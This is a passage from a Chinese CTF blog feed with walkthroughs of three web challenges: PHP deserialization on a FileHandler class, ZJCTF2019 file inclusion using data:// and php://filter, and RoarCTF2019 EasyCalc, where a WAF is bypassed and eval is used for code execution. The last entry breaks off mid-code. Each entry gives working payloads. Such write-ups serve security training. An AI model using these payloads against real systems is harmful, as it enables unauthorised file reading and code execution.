class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>最上面的__construct方法可以直接忽略，因为只有在创建对象时初始化对象的属性时才会触发。</p><p>所以我们直接看下面的__destruct方法，因为可以在反序列化时触发。</p><p>首先会进行一个强类型比较会把我们的op赋值为1，绕过很简单，只要我们反序列化的op为数字2即可绕过，然后就会执行process()方法，然后又能绕过弱类型比较。然后执行read()方法赋值给$res，然后会输出$res的内容。而read()方法会使用file_get_contents函数去读取我们传入的filename，所以我们反序列化的时候将filename赋值为flag.php即可，最后就能通过output函数输出flag了</p><p>3、构造pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br><br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>());<br></code></pre></td></tr></table></figure><p><strong>这里我们需要将这三个成员属性的修饰类型改为public，因为php7对成员属性的修饰类型不敏感，由于在原代码中，op等的属性为protected，is_valid($s)判断，这个主要是会使得我们在序列化protected属性的变量时带着的空字符被检测出来。将protected属性改为public属性(公共的 任何成员都可以访问)，即可解决该问题。</strong></p><p>我们能得到这样一串序列化字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>4、构造payload：</p><p>所以payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?str=O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;<br><br>得到flag<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;flag&#123;228ac245-1573-43af-8075-95ec3af0fb35&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>然后查看源代码就能看到flag了。这里还可以使用php伪协议来读取flag.php文件，但是要进行base64解码。</p><p>payload：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">?</span><span class="hljs-variable">str</span><span class="hljs-operator">=</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">11</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;FileHandler&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;op&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">i</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">8</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;filename&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">57</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;content&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">N</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">得到PD9waHAgJGZsYWc9J2ZsYWd7MjI4YWMyNDUtMTU3My00M2FmLTgwNzUtOTVlYzNhZjBmYjM1fSc7Cg==<br>解码之后就得到flag了<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;flag&#123;228ac245-1573-43af-8075-95ec3af0fb35&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF2019-NiZhuanSiWei1</title>
      <link href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"/>
      <url>/2025/03/13/ZJCTF2019-NiZhuanSiWei1/</url>
      
        <content type="html"><![CDATA[<h1 id="ZJCTF2019-NiZhuanSiWei1"><a href="#ZJCTF2019-NiZhuanSiWei1" class="headerlink" title="ZJCTF2019-NiZhuanSiWei1"></a>ZJCTF2019-NiZhuanSiWei1</h1><p>1、启动靶机并访问，上来就是一串源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2、这里很明显了,include($file)，说明是一道文件包含题，而且提示我们包含<code>useless.php</code>。</p><p><strong>3、php代码审计，我们这里必须让file_get_contents($text,’r’)之后的内容为”welcome to the zjctf”，这里可以 利用php伪协议中的data协议，payload为text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</strong></p><p><strong>file_get_contents($text,’r’)的时候，$text&#x3D;c会被当做url处理，而读取到的内容就是逗号后面的输入</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">text</span>=data://text/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;<span class="hljs-attribute">file</span>=useless.php<br></code></pre></td></tr></table></figure><p>4、发现页面显示welcome to the zjctf，说明我们成功包含了useless.php，但是没有显示flag，因为include直接包含php文件会执行其中代码，所以这里还要用filter伪协议进行base64加密后读取</p><p>输入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">text</span>=data://text/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;<span class="hljs-attribute">file</span>=php://filter/convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p>5、得到一串加密后的字符串</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAgIAoKY<span class="hljs-number">2</span>xhc<span class="hljs-number">3</span>MgRmxhZ<span class="hljs-number">3</span>sgIC<span class="hljs-number">8</span>vZmxhZy<span class="hljs-number">5</span>waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZ<span class="hljs-symbol">nVuY3</span>Rpb<span class="hljs-number">24</span>gX<span class="hljs-number">190</span>b<span class="hljs-number">3</span><span class="hljs-symbol">N0</span>cmluZygpeyAgCiAgICAgICAgaWYoaX<span class="hljs-symbol">NzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2</span>hvIGZpbGVfZ<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRlbnRzKCR0</span>aGlzLT<span class="hljs-number">5</span>maWxlKTsgCiAgICAgICAgICAgIGVja<span class="hljs-name">G8</span>gIjxicj<span class="hljs-number">4</span>iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE<span class="hljs-number">9</span>TRSAhLy<span class="hljs-number">8</span>vQ<span class="hljs-number">09</span><span class="hljs-symbol">NRSBPTiBQTFoiKTsKICAgICAgICB9</span>ICAKICAgIH<span class="hljs-number">0</span>gIAp<span class="hljs-number">9</span>ICAKPz<span class="hljs-number">4</span>gIAo=<br></code></pre></td></tr></table></figure><p>base64解密后即可得到几行php代码，并没有拿到flag，还得继续</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p>6、又要代码审计了，发现这是一个Flag类，然后很明显我们要利用其中的__toString魔术方法来得到flag，但是需要反序列化漏洞来触发，这时回想到了一开始的代码里我们没有用到的password传参，发现这里会对$password进行反序列化，然后ehco输出，正好可以触发__toString魔术方法，所以我们只要构造正确的反序列化字符串即可拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>       <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br></code></pre></td></tr></table></figure><p>7、构造反序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br>得到<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>8、结合前面的payload即可拿到flag</p><p>最后的payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;<br><br>然后查看源代码即可拿到flag<br></code></pre></td></tr></table></figure><p>注意：这里对useless.php就不需要使用伪协议了，因为我们这里需要它被包含并执行其中的代码，才能通过反序列化漏洞得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF2019-EasyCalc1</title>
      <link href="/2025/03/12/RoarCTF2019-EasyCalc1/"/>
      <url>/2025/03/12/RoarCTF2019-EasyCalc1/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF2019-EasyCalc1"><a href="#RoarCTF2019-EasyCalc1" class="headerlink" title="RoarCTF2019-EasyCalc1"></a>RoarCTF2019-EasyCalc1</h1><h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>1、首先打开是一个计算器界面，然后查看源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    $(<span class="hljs-string">&#x27;#calc&#x27;</span>).<span class="hljs-title function_">submit</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).<span class="hljs-title function_">val</span>()),</span><br><span class="language-javascript">            <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;GET&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span><br><span class="language-javascript">                $(<span class="hljs-string">&quot;#result&quot;</span>).<span class="hljs-title function_">html</span>(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span></span><br><span class="hljs-string"><span class="language-javascript">            &lt;/div&gt;`</span>);</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2、这里显示使用了waf，然后有啊一个calc.php文件，直接url访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node5.buuoj.cn:<span class="hljs-number">26596</span><span class="hljs-regexp">/calc.php/</span><br></code></pre></td></tr></table></figure><p>3、很明显是一个命令执行语句，传参是num，并且过滤了一些字符，特别是过滤了单双引号。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>4、由于过滤了单双引号我们尝试使用无参数RCE的payload：</p><p>查看当前目录下文件：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">http://node5.buuoj.cn:<span class="hljs-number">26596</span>/calc.php?num=<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>5、如果我们的传参被过滤了应该会显示”whar are you want to do?”，但是这里显示这个：</p><p><img src="/../image/RoarCTF2019-EasyCalc1-1.png"></p><p>所以猜测是被防火墙拦截了。</p><p>6、这题的重点，空格绕过waf，只需要在传参?后加一个空格即可绕过waf</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">http://node5.buuoj.cn:<span class="hljs-number">26596</span>/calc.php? num=<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>成功回显当前目录下文件</p><p><img src="/../image/RoarCTF2019-EasyCalc1-2.png"></p><p>7、当前目录下没有发现flag文件，所以继续查看根目录下文件，这里因为没有过滤函数参数，所以比正常的无参数rce更简单一点，我们可以使用chr函数来构造文件名，他可以将ascii码转换为字符，而且可以拼接为字符串。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">查看当前目录下文件<br>http://node5.buuoj.cn:<span class="hljs-number">26596</span>/calc.php? num=<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">chr</span>(<span 